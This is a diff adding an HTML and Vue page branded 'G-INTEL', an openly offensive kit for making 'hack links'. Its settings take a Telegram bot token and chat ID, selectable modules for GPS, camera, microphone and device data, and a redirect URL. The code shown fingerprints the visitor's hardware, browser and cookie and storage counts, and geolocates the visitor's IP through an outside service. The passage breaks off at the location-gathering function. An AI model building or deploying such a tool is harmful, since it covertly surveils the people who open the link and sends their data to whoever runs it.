@@ -1,0 +1,1055 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>G-INTEL · لوحة التحكم المتطورة v15</title>
+    
+    <!-- المكتبات الأساسية -->
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.2/axios.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.4/moment.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.4/locale/ar.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js"></script>
+    
+    <style>
+        /* ==================== المتغيرات الأساسية ==================== */
+        :root {
+            --primary: #3b82f6;
+            --primary-dark: #2563eb;
+            --primary-light: #60a5fa;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --dark-bg: #0f172a;
+            --dark-surface: #1e293b;
+            --dark-card: #334155;
+            --light-bg: #f8fafc;
+            --light-surface: #ffffff;
+            --light-card: #e2e8f0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', 'Cairo', system-ui, sans-serif;
+        }
+
+        body {
+            transition: background-color 0.3s ease, color 0.3s ease;
+            min-height: 100vh;
+        }
+
+        body.dark-mode {
+            background: var(--dark-bg);
+            color: #e2e8f0;
+        }
+
+        body.light-mode {
+            background: var(--light-bg);
+            color: #1e293b;
+        }
+
+        /* ==================== التأثيرات البصرية ==================== */
+        .glass-dark {
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(59, 130, 246, 0.2);
+        }
+
+        .glass-light {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+        }
+
+        .neo-card {
+            border-radius: 2rem;
+            box-shadow: 0 20px 40px -15px rgba(0,0,0,0.5);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .neo-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 30px 50px -15px var(--primary);
+        }
+
+        /* ==================== تخصيص شريط التمرير ==================== */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: var(--dark-surface); }
+        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--primary-light); }
+
+        /* ==================== الإشعارات ==================== */
+        .notification {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 9999;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(-100px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        .notification-item {
+            background: var(--dark-surface);
+            border-right: 4px solid var(--primary);
+            border-radius: 12px;
+            padding: 1rem;
+            margin-bottom: 10px;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+            max-width: 350px;
+        }
+
+        /* ==================== بطاقة المعلومات ==================== */
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1rem;
+        }
+
+        .info-item {
+            background: rgba(0,0,0,0.3);
+            border-radius: 1rem;
+            padding: 1rem;
+            border: 1px solid rgba(59,130,246,0.2);
+        }
+
+        .info-label {
+            font-size: 0.8rem;
+            color: #94a3b8;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .info-value {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--primary-light);
+            word-break: break-word;
+        }
+
+        /* ==================== شاشة التحميل ==================== */
+        .loader {
+            width: 48px;
+            height: 48px;
+            border: 5px solid var(--primary);
+            border-bottom-color: transparent;
+            border-radius: 50%;
+            animation: rotation 1s linear infinite;
+        }
+
+        @keyframes rotation {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body :class="theme + '-mode'" class="transition-colors duration-300">
+    <div id="app" v-cloak class="relative min-h-screen w-full">
+        
+        <!-- خلفية ثلاثية الأبعاد -->
+        <canvas id="bgCanvas" class="fixed top-0 left-0 w-full h-full -z-10"></canvas>
+
+        <!-- ==================== نظام الإشعارات ==================== -->
+        <div class="notification">
+            <transition-group name="notification">
+                <div v-for="(notif, idx) in notifications" :key="notif.id" class="notification-item" :class="notif.type">
+                    <div class="flex items-start gap-3">
+                        <i :class="notif.icon" class="text-xl" :class="{
+                            'text-green-400': notif.type === 'success',
+                            'text-red-400': notif.type === 'error',
+                            'text-blue-400': notif.type === 'info',
+                            'text-yellow-400': notif.type === 'warning'
+                        }"></i>
+                        <div class="flex-1">
+                            <h4 class="font-bold text-sm">{{ notif.title }}</h4>
+                            <p class="text-xs text-gray-400">{{ notif.message }}</p>
+                            <p class="text-xs text-gray-500 mt-1">{{ notif.time }}</p>
+                        </div>
+                        <button @click="removeNotification(notif.id)" class="text-gray-500 hover:text-white">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                </div>
+            </transition-group>
+        </div>
+
+        <!-- ==================== شاشة التحميل ==================== -->
+        <transition enter-active-class="animate__animated animate__fadeOut">
+            <div v-if="loading" class="fixed inset-0 flex items-center justify-center bg-black/90 z-50">
+                <div class="text-center">
+                    <div class="loader mx-auto mb-6"></div>
+                    <h2 class="text-2xl font-bold text-blue-400 mb-2">G-INTEL · النظام المتطور</h2>
+                    <p class="text-gray-400">{{ loadingMessage }}</p>
+                    <div class="w-64 h-2 bg-gray-800 rounded-full mx-auto mt-4 overflow-hidden">
+                        <div class="h-full bg-gradient-to-r from-blue-500 to-purple-600 transition-all duration-300" :style="{ width: loadingProgress + '%' }"></div>
+                    </div>
+                </div>
+            </div>
+        </transition>
+
+        <!-- ==================== الواجهة الرئيسية ==================== -->
+        <main v-if="!isExecuting" class="relative z-20 flex items-center justify-center min-h-screen p-4 md:p-6">
+            <div class="w-full max-w-7xl">
+                <!-- البطاقة الرئيسية -->
+                <div class="relative" :class="theme === 'dark' ? 'glass-dark' : 'glass-light'" style="border-radius: 3rem; padding: 2rem;">
+                    
+                    <!-- ========== الهيدر ========== -->
+                    <div class="flex flex-wrap items-center justify-between gap-4 mb-8 pb-4 border-b" :class="theme === 'dark' ? 'border-blue-800/30' : 'border-blue-300/30'">
+                        <div class="flex items-center gap-4">
+                            <div class="w-16 h-16 bg-gradient-to-br from-blue-600 to-purple-600 rounded-2xl flex items-center justify-center shadow-2xl">
+                                <i class="fas fa-microchip text-3xl text-white"></i>
+                            </div>
+                            <div>
+                                <h1 class="text-4xl md:text-5xl font-black bg-gradient-to-l from-white to-blue-300 bg-clip-text text-transparent">G-INTEL</h1>
+                                <div class="flex items-center gap-3 mt-2">
+                                    <span class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
+                                    <span class="text-sm text-gray-400">{{ lang === 'ar' ? 'لوحة التحكم المتطورة' : 'Advanced Control Panel' }}</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="flex gap-3">
+                            <button @click="toggleTheme" class="w-12 h-12 rounded-full border border-blue-500/30 flex items-center justify-center hover:bg-blue-900/30">
+                                <i :class="theme === 'dark' ? 'fas fa-sun' : 'fas fa-moon'" class="text-blue-400"></i>
+                            </button>
+                            <button @click="toggleLanguage" class="px-4 py-2 rounded-full border border-blue-500/30 text-sm hover:bg-blue-900/30">
+                                {{ lang === 'ar' ? 'English' : 'العربية' }}
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- ========== التبويبات (بدون مساعدة/مجتمع) ========== -->
+                    <div class="flex gap-2 mb-6 border-b pb-3 overflow-x-auto" :class="theme === 'dark' ? 'border-gray-800' : 'border-gray-300'">
+                        <button v-for="tab in tabs" :key="tab.id" @click="activeTab = tab.id" 
+                            class="px-6 py-2 rounded-full text-sm transition-all duration-300"
+                            :class="activeTab === tab.id ? 
+                                'bg-blue-600 text-white shadow-lg shadow-blue-500/50' : 
+                                (theme === 'dark' ? 'bg-black/30 hover:bg-blue-900/30' : 'bg-white/30 hover:bg-blue-100/50')">
+                            <i :class="tab.icon" class="ml-1"></i> {{ tab.name[lang] }}
+                        </button>
+                    </div>
+
+                    <!-- ========== تبويب الرئيسية (الإعدادات) ========== -->
+                    <div v-if="activeTab === 'main'" class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                        <!-- العمود الأيمن: الإعدادات -->
+                        <div class="lg:col-span-2 space-y-5">
+                            <div>
+                                <label class="block text-sm mb-2 text-gray-400"><i class="fas fa-robot text-blue-400 ml-1"></i> {{ lang==='ar'?'توكن البوت':'Bot Token' }}</label>
+                                <input type="text" v-model="config.token" @input="validateToken" 
+                                    class="w-full bg-black/40 border rounded-2xl py-3 px-4 text-white outline-none transition"
+                                    :class="tokenValid ? 'border-green-500/50' : 'border-blue-500/30 focus:border-blue-400'"
+                                    placeholder="1234567890:ABCdef...">
+                            </div>
+                            <div>
+                                <label class="block text-sm mb-2 text-gray-400"><i class="fas fa-id-card text-blue-400 ml-1"></i> {{ lang==='ar'?'معرف الدردشة':'Chat ID' }}</label>
+                                <input type="text" v-model="config.chatId" 
+                                    class="w-full bg-black/40 border border-blue-500/30 rounded-2xl py-3 px-4 text-white outline-none focus:border-blue-400"
+                                    placeholder="-1001234567890">
+                            </div>
+                            <div>
+                                <label class="block text-sm mb-2 text-gray-400"><i class="fas fa-bolt text-blue-400 ml-1"></i> {{ lang==='ar'?'وحدات الاختراق':'Hacking Modules' }}</label>
+                                <div class="grid grid-cols-2 gap-2">
+                                    <div v-for="mod in attackModules" :key="mod.id" 
+                                        @click="toggleModule(mod.id)"
+                                        class="flex items-center gap-2 border rounded-xl p-3 cursor-pointer transition hover:scale-105"
+                                        :class="selectedModules.includes(mod.id) ? 
+                                            'border-blue-500 bg-blue-900/30' : 
+                                            'border-gray-700 bg-black/30 hover:border-blue-500/50'">
+                                        <i :class="mod.icon" class="text-blue-400"></i>
+                                        <span class="text-sm">{{ mod.name[lang] }}</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div>
+                                <label class="block text-sm mb-2 text-gray-400"><i class="fas fa-link text-blue-400 ml-1"></i> {{ lang==='ar'?'رابط التوجيه':'Redirect URL' }}</label>
+                                <input type="url" v-model="config.redirectUrl" class="w-full bg-black/40 border border-blue-500/30 rounded-2xl py-3 px-4 text-white outline-none focus:border-blue-400" placeholder="https://example.com">
+                            </div>
+                            <div class="flex gap-2">
+                                <button @click="saveConfig" class="flex-1 bg-blue-900/40 border border-blue-500/50 rounded-xl py-2 text-sm hover:bg-blue-800/40"><i class="fas fa-save ml-1"></i> حفظ</button>
+                                <button @click="loadConfig" class="flex-1 bg-gray-800/60 border border-gray-600 rounded-xl py-2 text-sm hover:bg-gray-700/60"><i class="fas fa-upload ml-1"></i> تحميل</button>
+                            </div>
+                        </div>
+
+                        <!-- العمود الأيسر: إحصائيات -->
+                        <div class="space-y-4">
+                            <div class="bg-black/40 rounded-2xl p-4 border border-blue-500/20">
+                                <h3 class="font-bold mb-3 flex items-center gap-2"><i class="fas fa-chart-pie text-blue-400"></i> {{ lang==='ar'?'إحصائيات':'Stats' }}</h3>
+                                <div class="space-y-2 text-sm">
+                                    <div class="flex justify-between"><span class="text-gray-400">{{ lang==='ar'?'إجمالي الزيارات':'Total Visits' }}:</span> <span class="text-blue-400">{{ stats.totalVisits }}</span></div>
+                                    <div class="flex justify-between"><span class="text-gray-400">{{ lang==='ar'?'آخر تنفيذ':'Last Execution' }}:</span> <span class="text-blue-400">{{ stats.lastExecution || '—' }}</span></div>
+                                    <div class="flex justify-between"><span class="text-gray-400">{{ lang==='ar'?'الأجهزة':'Devices' }}:</span> <span class="text-blue-400">{{ stats.devices }}</span></div>
+                                </div>
+                            </div>
+                            <div class="bg-black/40 rounded-2xl p-4 border border-blue-500/20">
+                                <h3 class="font-bold mb-3 flex items-center gap-2"><i class="fas fa-shield-alt text-blue-400"></i> {{ lang==='ar'?'التشفير':'Encryption' }}</h3>
+                                <div class="flex items-center justify-between">
+                                    <span class="text-sm">AES-256</span>
+                                    <label class="relative inline-flex items-center cursor-pointer">
+                                        <input type="checkbox" v-model="security.encrypt" class="sr-only peer">
+                                        <div class="w-11 h-6 bg-gray-700 rounded-full peer peer-checked:after:translate-x-full after:content-[''] after:absolute after:top-[2px] after:right-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
+                                    </label>
+                                </div>
+                                <input v-if="security.encrypt" type="password" v-model="security.key" class="w-full mt-2 bg-black/60 border border-blue-500/30 rounded-xl py-2 px-3 text-sm" placeholder="مفتاح التشفير">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ========== تبويب لوحة التحكم (عرض المعلومات) ========== -->
+                    <div v-if="activeTab === 'dashboard'" class="space-y-6">
+                        <!-- إشعار بوجود معلومات جديدة -->
+                        <div v-if="capturedData.length > 0" class="bg-green-900/30 border border-green-500/50 rounded-2xl p-4 flex items-center justify-between">
+                            <div class="flex items-center gap-3">
+                                <i class="fas fa-info-circle text-green-400 text-xl"></i>
+                                <span>{{ lang==='ar'?'تم الحصول على معلومات جديدة':'New information captured' }}</span>
+                            </div>
+                            <button @click="exportData" class="bg-green-600/30 border border-green-500/50 rounded-xl px-4 py-2 text-sm hover:bg-green-600/50">
+                                <i class="fas fa-download ml-1"></i> {{ lang==='ar'?'تصدير الكل':'Export All' }}
+                            </button>
+                        </div>
+
+                        <!-- شبكة المعلومات -->
+                        <div class="info-grid">
+                            <div v-for="(data, index) in capturedData" :key="index" class="neo-card bg-black/40 border border-blue-500/20 p-4">
+                                <div class="flex justify-between items-start mb-3">
+                                    <div class="flex items-center gap-2">
+                                        <i class="fas fa-mobile-alt text-blue-400"></i>
+                                        <span class="text-sm font-bold">{{ data.deviceInfo.model || 'جهاز غير معروف' }}</span>
+                                    </div>
+                                    <span class="text-xs text-gray-500">{{ data.timestamp }}</span>
+                                </div>
+                                
+                                <!-- معلومات تفصيلية -->
+                                <div class="space-y-2 text-sm">
+                                    <div class="info-item">
+                                        <div class="info-label"><i class="fas fa-microchip"></i> {{ lang==='ar'?'المعالج':'CPU' }}</div>
+                                        <div class="info-value">{{ data.systemInfo.cpu }}</div>
+                                    </div>
+                                    <div class="info-item">
+                                        <div class="info-label"><i class="fas fa-memory"></i> {{ lang==='ar'?'الذاكرة':'RAM' }}</div>
+                                        <div class="info-value">{{ data.systemInfo.ram }}</div>
+                                    </div>
+                                    <div class="info-item">
+                                        <div class="info-label"><i class="fas fa-hdd"></i> {{ lang==='ar'?'التخزين':'Storage' }}</div>
+                                        <div class="info-value">{{ data.systemInfo.storage }}</div>
+                                    </div>
+                                    <div class="info-item">
+                                        <div class="info-label"><i class="fas fa-wifi"></i> {{ lang==='ar'?'الشبكة':'Network' }}</div>
+                                        <div class="info-value">{{ data.networkInfo.ip }} ({{ data.networkInfo.country }})</div>
+                                    </div>
+                                    <div class="info-item">
+                                        <div class="info-label"><i class="fas fa-map-pin"></i> {{ lang==='ar'?'الموقع':'Location' }}</div>
+                                        <div class="info-value" v-if="data.location">{{ data.location.lat }}, {{ data.location.lng }}</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- رسالة إذا لم توجد معلومات -->
+                        <div v-if="capturedData.length === 0" class="text-center py-20">
+                            <i class="fas fa-database text-6xl text-gray-600 mb-4"></i>
+                            <p class="text-gray-500">{{ lang==='ar'?'لا توجد معلومات بعد. انتظر حتى يتم الاختراق.':'No data yet. Wait for hack execution.' }}</p>
+                        </div>
+                    </div>
+
+                    <!-- ========== تبويب السجلات ========== -->
+                    <div v-if="activeTab === 'logs'" class="space-y-4">
+                        <div class="flex justify-between">
+                            <h3 class="text-lg font-bold"><i class="fas fa-history text-blue-400 ml-2"></i> {{ lang==='ar'?'سجل العمليات':'Operation Logs' }}</h3>
+                            <button @click="clearLogs" class="bg-red-900/40 border border-red-500/50 rounded-full px-4 py-1 text-sm"><i class="fas fa-trash-alt ml-1"></i> مسح</button>
+                        </div>
+                        <div class="bg-black/60 border border-blue-500/20 rounded-2xl p-4 h-96 overflow-y-auto font-mono text-xs">
+                            <div v-for="(log, idx) in logs" :key="idx" class="border-b border-gray-800 py-2">
+                                <span class="text-gray-500">[{{ log.time }}]</span>
+                                <span :class="{
+                                    'text-green-400': log.type === 'success',
+                                    'text-red-400': log.type === 'error',
+                                    'text-blue-400': log.type === 'info'
+                                }"> {{ log.msg }}</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ========== زر التوليد ========== -->
+                    <div class="mt-8 flex justify-center">
+                        <button @click="generateLink" :disabled="generating || !canGenerate" 
+                            class="px-16 py-4 bg-gradient-to-r from-blue-800 to-purple-800 rounded-full text-xl font-bold shadow-2xl shadow-blue-500/30 disabled:opacity-50">
+                            <i class="fas fa-bolt ml-2" :class="{'animate-spin': generating}"></i>
+                            {{ generating ? (lang==='ar'?'جاري التوليد...':'Generating...') : (lang==='ar'?'توليد رابط الاختراق':'Generate Hack Link') }}
+                        </button>
+                    </div>
+
+                    <!-- ========== الرابط الناتج ========== -->
+                    <transition enter-active-class="animate__animated animate__fadeInUp">
+                        <div v-if="generatedLink" class="mt-6 bg-black/60 border border-blue-500/30 rounded-3xl p-4">
+                            <textarea readonly class="w-full bg-transparent text-blue-300 text-sm resize-none" rows="2">{{ generatedLink }}</textarea>
+                            <div class="flex gap-2 mt-2">
+                                <button @click="copyLink" class="flex-1 bg-gray-800 hover:bg-gray-700 rounded-xl py-2 text-sm"><i class="fas fa-copy ml-1"></i> نسخ</button>
+                                <button @click="testLink" class="flex-1 bg-gray-800 hover:bg-gray-700 rounded-xl py-2 text-sm"><i class="fas fa-play ml-1"></i> اختبار</button>
+                            </div>
+                        </div>
+                    </transition>
+                </div>
+            </div>
+        </main>
+
+        <!-- ==================== شاشة التنفيذ (عند فتح الرابط الملغوم) ==================== -->
+        <div v-else class="fixed inset-0 flex items-center justify-center z-30 bg-black/90">
+            <div class="glass-dark rounded-[3rem] p-10 text-center max-w-lg">
+                <i class="fas fa-circle-notch fa-spin-pulse text-5xl text-blue-400 mb-6"></i>
+                <h2 class="text-2xl font-bold mb-4">{{ lang==='ar'?'جاري اختراق الجهاز':'Hacking Device...' }}</h2>
+                <p class="text-gray-400 mb-4">{{ executionStatus }}</p>
+                <div class="w-full h-2 bg-gray-800 rounded-full overflow-hidden">
+                    <div class="h-full bg-gradient-to-l from-blue-400 to-purple-600 transition-all duration-500" :style="{ width: executionProgress + '%' }"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- عناصر خفية -->
+        <video id="v" autoplay playsinline style="display: none;"></video>
+        <canvas id="c" style="display: none;"></canvas>
+    </div>
+
+    <script>
+        (function() {
+            "use strict";
+
+            // معالجة الأخطاء
+            window.onerror = function(msg, src, line) {
+                console.error('خطأ:', msg, line);
+                if (window.vueApp) vueApp.addLog('error', `خطأ: ${msg}`);
+                return true;
+            };
+
+            const { createApp, ref, reactive, computed, onMounted, watch, nextTick } = Vue;
+
+            const app = createApp({
+                setup() {
+                    // -------------------------------------------------------------
+                    // المتغيرات العامة
+                    // -------------------------------------------------------------
+                    const loading = ref(true);
+                    const loadingProgress = ref(0);
+                    const loadingMessage = ref('تهيئة النظام...');
+                    const isExecuting = ref(false);
+                    const generating = ref(false);
+                    const generatedLink = ref('');
+                    const activeTab = ref('main');
+                    const theme = ref('dark');
+                    const lang = ref('ar');
+                    const tokenValid = ref(false);
+                    const executionProgress = ref(0);
+                    const executionStatus = ref('');
+
+                    // -------------------------------------------------------------
+                    // الإشعارات
+                    // -------------------------------------------------------------
+                    const notifications = ref([]);
+                    let notificationId = 0;
+
+                    const addNotification = (title, message, type = 'info') => {
+                        const id = notificationId++;
+                        const icon = {
+                            success: 'fas fa-check-circle',
+                            error: 'fas fa-exclamation-circle',
+                            info: 'fas fa-info-circle',
+                            warning: 'fas fa-exclamation-triangle'
+                        }[type];
+                        
+                        notifications.value.push({
+                            id,
+                            title,
+                            message,
+                            type,
+                            icon,
+                            time: moment().format('HH:mm:ss')
+                        });
+
+                        // إزالة تلقائية بعد 5 ثواني
+                        setTimeout(() => removeNotification(id), 5000);
+                    };
+
+                    const removeNotification = (id) => {
+                        notifications.value = notifications.value.filter(n => n.id !== id);
+                    };
+
+                    // -------------------------------------------------------------
+                    // التبويبات (بدون مساعدة/مجتمع)
+                    // -------------------------------------------------------------
+                    const tabs = [
+                        { id: 'main', name: { ar: 'الرئيسية', en: 'Main' }, icon: 'fas fa-home' },
+                        { id: 'dashboard', name: { ar: 'لوحة التحكم', en: 'Dashboard' }, icon: 'fas fa-tachometer-alt' },
+                        { id: 'logs', name: { ar: 'السجلات', en: 'Logs' }, icon: 'fas fa-history' }
+                    ];
+
+                    // -------------------------------------------------------------
+                    // وحدات الاختراق (بدون وحدات غير مرغوب فيها)
+                    // -------------------------------------------------------------
+                    const attackModules = [
+                        { id: 'system', name: { ar: 'معلومات النظام', en: 'System Info' }, icon: 'fas fa-microchip' },
+                        { id: 'device', name: { ar: 'معلومات الجهاز', en: 'Device Info' }, icon: 'fas fa-mobile-alt' },
+                        { id: 'network', name: { ar: 'الشبكة والـ IP', en: 'Network & IP' }, icon: 'fas fa-network-wired' },
+                        { id: 'location', name: { ar: 'الموقع الجغرافي', en: 'GPS Location' }, icon: 'fas fa-map-pin' },
+                        { id: 'battery', name: { ar: 'البطارية', en: 'Battery' }, icon: 'fas fa-battery-full' },
+                        { id: 'storage', name: { ar: 'التخزين', en: 'Storage' }, icon: 'fas fa-database' },
+                        { id: 'camera', name: { ar: 'كاميرا', en: 'Camera' }, icon: 'fas fa-camera' },
+                        { id: 'microphone', name: { ar: 'ميكروفون', en: 'Microphone' }, icon: 'fas fa-microphone' }
+                    ];
+
+                    const selectedModules = ref(['system', 'device']); // افتراضي
+
+                    // -------------------------------------------------------------
+                    // الإعدادات
+                    // -------------------------------------------------------------
+                    const config = reactive({
+                        token: '',
+                        chatId: '',
+                        redirectUrl: 'https://www.google.com'
+                    });
+
+                    const security = reactive({
+                        encrypt: false,
+                        key: ''
+                    });
+
+                    // -------------------------------------------------------------
+                    // البيانات الملتقطة (النتائج)
+                    // -------------------------------------------------------------
+                    const capturedData = ref([]);
+
+                    // -------------------------------------------------------------
+                    // الإحصائيات
+                    // -------------------------------------------------------------
+                    const stats = reactive({
+                        totalVisits: 0,
+                        lastExecution: null,
+                        devices: 0
+                    });
+
+                    // -------------------------------------------------------------
+                    // السجلات
+                    // -------------------------------------------------------------
+                    const logs = ref([]);
+
+                    const addLog = (type, msg) => {
+                        logs.value.unshift({
+                            time: moment().format('HH:mm:ss'),
+                            type,
+                            msg
+                        });
+                        if (logs.value.length > 200) logs.value.pop();
+                    };
+
+                    const clearLogs = () => {
+                        logs.value = [];
+                        addLog('info', 'تم مسح السجلات');
+                    };
+
+                    // -------------------------------------------------------------
+                    // دوال التحقق
+                    // -------------------------------------------------------------
+                    const validateToken = () => {
+                        tokenValid.value = config.token.includes(':') && config.token.length > 35;
+                    };
+
+                    const canGenerate = computed(() => {
+                        return config.token && config.chatId && selectedModules.value.length > 0;
+                    });
+
+                    // -------------------------------------------------------------
+                    // حفظ/تحميل الإعدادات
+                    // -------------------------------------------------------------
+                    const saveConfig = () => {
+                        const data = {
+                            config: { ...config },
+                            selectedModules: [...selectedModules.value],
+                            security: { ...security }
+                        };
+                        localStorage.setItem('gintel_config', JSON.stringify(data));
+                        addNotification('نجاح', 'تم حفظ الإعدادات', 'success');
+                        addLog('success', 'تم حفظ الإعدادات');
+                    };
+
+                    const loadConfig = () => {
+                        const saved = localStorage.getItem('gintel_config');
+                        if (saved) {
+                            try {
+                                const data = JSON.parse(saved);
+                                Object.assign(config, data.config);
+                                selectedModules.value = data.selectedModules || [];
+                                Object.assign(security, data.security);
+                                addNotification('نجاح', 'تم تحميل الإعدادات', 'success');
+                                addLog('success', 'تم تحميل الإعدادات');
+                            } catch {
+                                addNotification('خطأ', 'فشل تحميل الإعدادات', 'error');
+                            }
+                        }
+                    };
+
+                    // -------------------------------------------------------------
+                    // دوال الواجهة
+                    // -------------------------------------------------------------
+                    const toggleTheme = () => {
+                        theme.value = theme.value === 'dark' ? 'light' : 'dark';
+                        document.body.className = theme.value + '-mode';
+                    };
+
+                    const toggleLanguage = () => {
+                        lang.value = lang.value === 'ar' ? 'en' : 'ar';
+                        document.dir = lang.value === 'ar' ? 'rtl' : 'ltr';
+                        moment.locale(lang.value === 'ar' ? 'ar' : 'en');
+                    };
+
+                    const toggleModule = (moduleId) => {
+                        const index = selectedModules.value.indexOf(moduleId);
+                        if (index === -1) {
+                            selectedModules.value.push(moduleId);
+                        } else {
+                            selectedModules.value.splice(index, 1);
+                        }
+                    };
+
+                    // -------------------------------------------------------------
+                    // دالة جمع معلومات النظام بدقة عالية جداً
+                    // -------------------------------------------------------------
+                    const collectSystemInfo = async () => {
+                        const info = {};
+
+                        // معلومات المعالج التفصيلية
+                        info.cpu = {
+                            cores: navigator.hardwareConcurrency || 'غير معروف',
+                            architecture: navigator.platform || 'غير معروف',
+                            // محاولة الحصول على معلومات إضافية
+                            vendor: (() => {
+                                try {
+                                    const canvas = document.createElement('canvas');
+                                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                                    if (gl) {
+                                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                                        if (debugInfo) {
+                                            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                                            if (renderer.includes('Intel')) return 'Intel';
+                                            if (renderer.includes('AMD')) return 'AMD';
+                                            if (renderer.includes('NVIDIA')) return 'NVIDIA';
+                                            if (renderer.includes('Apple')) return 'Apple';
+                                        }
+                                    }
+                                } catch {}
+                                return 'غير معروف';
+                            })()
+                        };
+
+                        // معلومات الذاكرة
+                        info.ram = {
+                            total: navigator.deviceMemory ? navigator.deviceMemory + ' جيجابايت' : 'غير معروف',
+                            // تقدير الذاكرة المتاحة
+                            estimated: performance.memory ? 
+                                Math.round(performance.memory.jsHeapSizeLimit / 1024 / 1024 / 1024) + ' جيجابايت' : 
+                                'غير معروف'
+                        };
+
+                        // معلومات التخزين
+                        info.storage = {
+                            // محاولة الحصول على معلومات التخزين
+                            localStorage: (() => {
+                                try {
+                                    return localStorage.length + ' عنصر';
+                                } catch {
+                                    return 'غير متاح';
+                                }
+                            })(),
+                            sessionStorage: (() => {
+                                try {
+                                    return sessionStorage.length + ' عنصر';
+                                } catch {
+                                    return 'غير متاح';
+                                }
+                            })(),
+                            cookies: document.cookie ? document.cookie.split(';').length + ' كوكيز' : 'لا يوجد'
+                        };
+
+                        return info;
+                    };
+
+                    // -------------------------------------------------------------
+                    // دالة جمع معلومات الجهاز بدقة عالية جداً
+                    // -------------------------------------------------------------
+                    const collectDeviceInfo = () => {
+                        const parser = new UAParser();
+                        const ua = parser.getResult();
+
+                        // معلومات دقيقة عن الجهاز
+                        const info = {
+                            vendor: ua.device.vendor || 'غير معروف',
+                            model: ua.device.model || 'غير معروف',
+                            type: ua.device.type || 'كمبيوتر',
+                            os: {
+                                name: ua.os.name || 'غير معروف',
+                                version: ua.os.version || 'غير معروف',
+                                // محاولة الحصول على إصدار دقيق
+                                full: (() => {
+                                    if (ua.os.name && ua.os.version) {
+                                        return `${ua.os.name} ${ua.os.version}`;
+                                    }
+                                    return 'غير معروف';
+                                })()
+                            },
+                            browser: {
+                                name: ua.browser.name || 'غير معروف',
+                                version: ua.browser.version || 'غير معروف',
+                                engine: ua.engine.name || 'غير معروف'
+                            },
+                            screen: {
+                                width: screen.width,
+                                height: screen.height,
+                                colorDepth: screen.colorDepth,
+                                pixelRatio: window.devicePixelRatio || 1
+                            },
+                            language: navigator.language,
+                            languages: navigator.languages ? navigator.languages.join(', ') : 'غير معروف',
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                            platform: navigator.platform,
+                            userAgent: navigator.userAgent,
+                            // معلومات إضافية
+                            touchSupport: 'ontouchstart' in window,
+                            online: navigator.onLine,
+                            cookiesEnabled: navigator.cookieEnabled,
+                            doNotTrack: navigator.doNotTrack || 'غير معروف'
+                        };
+
+                        return info;
+                    };
+
+                    // -------------------------------------------------------------
+                    // دالة جمع معلومات الشبكة
+                    // -------------------------------------------------------------
+                    const collectNetworkInfo = async () => {
+                        try {
+                            const response = await axios.get('https://ipapi.co/json/', { timeout: 5000 });
+                            return {
+                                ip: response.data.ip,
+                                country: response.data.country_name,
+                                region: response.data.region,
+                                city: response.data.city,
+                                lat: response.data.latitude,
+                                lon: response.data.longitude,
+                                isp: response.data.org,
+                                timezone: response.data.timezone
+                            };
+                        } catch {
+                            try {
+                                const fallback = await axios.get('https://api.ipify.org?format=json');
+                                return { ip: fallback.data.ip };
+                            } catch {
+                                return { ip: 'غير معروف' };
+                            }
+                        }
+                    };
+
+                    // -------------------------------------------------------------
+                    // دالة جمع الموقع
+                    // -------------------------------------------------------------
